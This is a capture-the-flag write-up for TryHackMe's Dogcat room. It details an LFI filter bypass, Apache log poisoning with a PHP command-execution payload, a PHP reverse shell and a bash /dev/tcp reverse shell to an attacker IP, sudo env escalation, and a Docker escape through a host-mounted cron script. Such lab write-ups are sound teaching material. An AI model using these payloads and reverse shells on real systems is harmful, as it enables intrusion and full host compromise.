# 🛡️ TryHackMe – Dogcat - Writeup

## 📌 Overview
**Room Name:** Dogcat  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web / LFI / Log Poisoning / Docker Escape

Linux (Docker) machine. LFI via PHP `include()` enables log poisoning for RCE, `sudo env` escalates to root inside the container, and a host-mounted cron script provides the Docker escape path.

Attack chain overview:

- Port scanning revealing HTTP on port 80
- LFI discovery via `?view=` parameter (PHP `include()`)
- Source code extraction with `php://filter` after bypassing string filter and `.php` auto-append
- Apache access log poisoning via User-Agent to achieve RCE
- Reverse shell as `www-data`, escalation to root via `sudo /usr/bin/env`
- Docker container detection and escape via host-mounted cron script

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -- -sV
```

```text
80/tcp open  http  Apache/2.4.38 (Debian)
```

Only HTTP was exposed.

### 🌐 Web Application Analysis

The site presented two buttons — "A dog" and "A cat" — which changed the URL to `/?view=dog` and `/?view=cat` respectively, loading different images. The `view` parameter immediately suggested file inclusion.

Testing with an unexpected value:

```bash
GET /?view=dog;ls
```

```text
Warning: include(dog;ls.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
```

This confirmed:
- PHP `include()` is being called with the `view` parameter directly
- `.php` is automatically appended to the value
- The full server path is `/var/www/html/index.php`

---

## 🔓 2. Source Code Extraction via php://filter

### 🔍 Bypassing the String Filter

To read the source code, `php://filter` with base64 encoding was the natural choice. However, sending it directly was blocked:

```bash
GET /?view=php://filter/convert.base64-encode/resource=index
# → "Sorry, only dogs or cats are allowed."
```

The application was checking that `view` contained `dog` or `cat` as a substring.

### 🔍 Bypassing the .php Auto-Append

Prefixing with `dog/` allowed the filter check to pass, but the `.php` suffix broke the wrapper:

```bash
GET /?view=dog/../php://filter/convert.base64-encode/resource=index
# → include(dog/../php://filter/convert.base64-encode/resource=index.php): failed
```

PHP was treating the entire string as a file path and appending `.php`, which broke `php://filter` recognition.

Testing whether an `ext` parameter could suppress the suffix:

```bash
GET /?view=cat/../index&ext=
# → include(cat/../index): No such file or directory
```

`.php` was gone — `ext` controls the suffix and an empty value disables it.

> **Thought process:** The `ext` parameter was a hypothesis based on CTF patterns — code that defaults a variable like `$ext = isset($_GET['ext']) ? $_GET['ext'] : '.php'` is a common design in these challenges. The error message confirming `.php` was appended made it worth testing.

### 💡 Working Payload

Combining both bypasses — embedding `cat` inside an absolute path and passing `ext=`:

```bash
GET /?view=php://filter/convert.base64-encode/resource=/var/www/html/cat/../index&ext=
```

Base64 output was returned. Decoded:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

The source confirmed the `ext` parameter and the `strpos`-based filter — no regex, just substring matching.

---

## 💀 3. RCE via Log Poisoning

### 🔍 Why Log Poisoning

No file upload was available. The server was Apache, which logs the `User-Agent` header in `access.log`. Since LFI could include the log file, injecting PHP into `User-Agent` would make it executable.

### Confirming Log Access

```bash
GET /?view=cat/../../../../var/log/apache2/access.log&ext=
```

The log contents were returned, and User-Agent strings from previous requests were visible — confirming the attack surface.

### Injecting the PHP Payload

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET_IP>/"
```

> **Important:** A malformed PHP payload in the log permanently breaks log-based RCE — PHP will throw a parse error every time the log is included, making the file unusable. Verify the payload syntax before sending it. If the log becomes corrupted, the machine must be reset.

### Confirming RCE

```bash
curl "http://<TARGET_IP>/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE confirmed as `www-data`.** ✅

### Reverse Shell

```bash
nc -lvnp 4444
```

```bash
curl "http://<TARGET_IP>/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22<KALI_IP>%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
```

**Shell obtained as `www-data`.** ✅

---

## 🚀 4. Privilege Escalation: www-data → root

### 🔍 Sudo Check

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/env
```

### 💥 GTFOBins — env

`env` sets environment variables and runs a command. With sudo, any command it spawns runs as root:

```bash
sudo /usr/bin/env /bin/sh
```

```bash
whoami
# root
```

**Root inside the container obtained.** ✅

---

## 🐳 5. Docker Escape

### 🔍 Detecting the Container

Two indicators confirmed this was a Docker container:

```bash
hostname
# ce1606f3ca8e   ← 12-char hex = Docker container ID prefix
```

```bash
ls -la /.dockerenv
# -rwxr-xr-x 1 root root 0 Apr 19 09:13 /.dockerenv
```

Docker automatically sets the container ID as the hostname and creates `/.dockerenv` in every container.

### 🔍 Finding the Escape Path

```bash
ls -la /opt/backups/
# backup.sh   (script)
# backup.tar  (timestamp updating every ~minute → cron is running this)

cat /opt/backups/backup.sh
```

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

The path `/root/container` does not exist inside the container — it's a **host-side path**. This meant:

- `/opt/backups/` is a bind-mounted directory shared between host and container
- The host's cron daemon is executing `backup.sh` periodically as root
- Editing `backup.sh` from inside the container will affect what runs on the host

### 💥 Exploitation

Started a listener on Kali:

```bash
nc -lvnp 5555
```

Appended a reverse shell to the script:

```bash
echo 'bash -i >& /dev/tcp/<KALI_IP>/5555 0>&1' >> /opt/backups/backup.sh
```

After the next cron execution, a shell appeared on the listener:

```bash
hostname
# dogcat   ← host machine, not the container
whoami
# root
```

**Host root shell obtained. Docker escape complete.** ✅

---

## 🏁 Flags

| Flag | Location |
|------|----------|
| flag1 | `/var/www/html/` directory |
| flag2 | `/var/www/flag2_QMW7JvaY2LvK.txt` |
| flag3 | `/root/flag3.txt` (inside container) |
| flag4 | `/root/flag4.txt` (on host, after escape) |

---

## 📚 Key Takeaways

- 🔗 **Chain LFI bypass techniques systematically:** String filter + `.php` auto-append were two independent obstacles. Each required its own bypass (`cat` in absolute path; `ext=` to suppress suffix). Solving them separately and combining was cleaner than trying to find a single payload for both.

- 💡 **Hypothesize parameters from code patterns:** `ext` was guessed before reading the source. When error messages reveal that a suffix is being appended, a controlling parameter is a plausible mechanism. Test the hypothesis, then confirm with source.

- 📋 **Verify PHP payloads before sending to log files:** A malformed PHP payload permanently breaks the log as an inclusion target. Parse errors are thrown on every subsequent include, making the file unusable. Send only verified payloads.

- 🔍 **Two signals that you're inside Docker:** Hostname matching a 12-character hex string (container ID), and the presence of `/.dockerenv`. Cross-check with `cat /proc/1/cgroup | grep docker` for certainty.

- 📦 **Shared mounts are the key to Docker escape:** Find directories accessible from both host and container. A host-side cron script stored in a shared mount is an ideal escalation primitive — edit the script inside the container, wait for the host to execute it.

---

## 🛠️ Tools Used

- `rustscan`
- `curl`
- `nc` (netcat)
- `php://filter` (LFI wrapper)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
